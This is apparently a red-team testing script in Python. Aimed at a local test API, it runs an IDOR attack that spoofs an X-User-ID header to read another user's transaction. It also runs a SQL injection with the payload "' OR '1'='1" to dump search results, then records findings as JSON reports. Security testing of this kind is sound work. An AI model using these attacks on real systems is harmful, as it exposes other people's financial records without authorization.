import os
import sys
import json
import urllib.request
import urllib.error
from datetime import datetime

if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8')

class RedTeamAttackEngine:
    def __init__(self, target_base_url="http://127.0.0.1:3000"):
        self.target_base_url = target_base_url.rstrip("/")

    def run_idor_attack(self):
        """
        Attempts to access User 102's transaction (ID: 2) while authenticated as User 101.
        """
        print("[🔴 RED TEAM] Running BOLA/IDOR Attack on /api/transactions/2...")
        url = f"{self.target_base_url}/api/transactions/2"
        headers = {"X-User-ID": "101"}
        
        req = urllib.request.Request(url, headers=headers)
        try:
            with urllib.request.urlopen(req) as resp:
                status_code = resp.getcode()
                body = resp.read().decode('utf-8')
                data = json.loads(body)

                # Check if we accessed another user's data (User 102)
                if data.get("user_id") == 102:
                    print(f"  [!] IDOR EXPLOIT SUCCESSFUL! Accessed User 102 data as User 101.")
                    finding = {
                        "id": "VULN-001",
                        "type": "IDOR",
                        "endpoint": "/api/transactions/2",
                        "http_method": "GET",
                        "severity": "high",
                        "description": "User 101 can access User 102 transaction history (Broken Object Level Authorization).",
                        "reproduction": {
                            "headers": headers,
                            "payload": {},
                            "url_params": {},
                            "test_user": "101"
                        },
                        "evidence": {
                            "status_code": status_code,
                            "response_body": body,
                            "extracted_data": f"Exfiltrated transaction for user {data.get('user_id')}: amount ${data.get('amount')}"
                        },
                        "timestamp": datetime.utcnow().isoformat() + "Z"
                    }
                    self._save_finding(finding)
                    return finding
                else:
                    print("  [-] IDOR Attack failed or authorization enforced.")
                    return None
        except urllib.error.HTTPError as e:
            print(f"  [-] Attack blocked with HTTP {e.code}")
            return None
        except Exception as e:
            print(f"  [-] Attack error: {e}")
            return None

    def run_sqli_attack(self):
        """
        Attempts SQL injection on transaction search.
        """
        print("[🔴 RED TEAM] Running SQL Injection Attack on /api/transactions/search...")
        payload = "' OR '1'='1"
        encoded_query = urllib.parse.quote(payload)
        url = f"{self.target_base_url}/api/transactions/search?q={encoded_query}"
        
        req = urllib.request.Request(url)
        try:
            with urllib.request.urlopen(req) as resp:
                status_code = resp.getcode()
                body = resp.read().decode('utf-8')
                data = json.loads(body)

                results = data.get("results", [])
                # If SQLi returned all rows (3 rows) when searching an arbitrary condition
                if len(results) >= 3:
                    print("  [!] SQLi EXPLOIT SUCCESSFUL! Bypassed search filter to dump database records.")
                    finding = {
                        "id": "VULN-002",
                        "type": "SQLI",
                        "endpoint": "/api/transactions/search",
                        "http_method": "GET",
                        "severity": "critical",
                        "description": "Unsanitized input in search endpoint allows SQL injection and unauthorized record retrieval.",
                        "reproduction": {
                            "headers": {},
                            "payload": {},
                            "url_params": {"q": payload},
                            "test_user": "anonymous"
                        },
                        "evidence": {
                            "status_code": status_code,
                            "response_body": body,
                            "extracted_data": f"Dumped {len(results)} transaction records."
                        },
                        "timestamp": datetime.utcnow().isoformat() + "Z"
                    }
                    self._save_finding(finding)
                    return finding
                else:
                    print("  [-] SQLi Attack failed or query parameterized.")
                    return None
        except urllib.error.HTTPError as e:
            print(f"  [-] SQLi Attack blocked with HTTP {e.code}")
            return None
        except Exception as e:
            print(f"  [-] SQLi Attack error: {e}")
            return None

    def _save_finding(self, finding):
        output_dir = os.path.join(os.path.dirname(__file__), "..", "reports")
        os.makedirs(output_dir, exist_ok=True)
        finding_file = os.path.join(output_dir, f"{finding['id']}_finding.json")
        with open(finding_file, "w") as f:
            json.dump(finding, f, indent=2)
        print(f"  [+] Finding saved to {finding_file}")

if __name__ == "__main__":
    engine = RedTeamAttackEngine()
    engine.run_idor_attack()
    engine.run_sqli_attack()
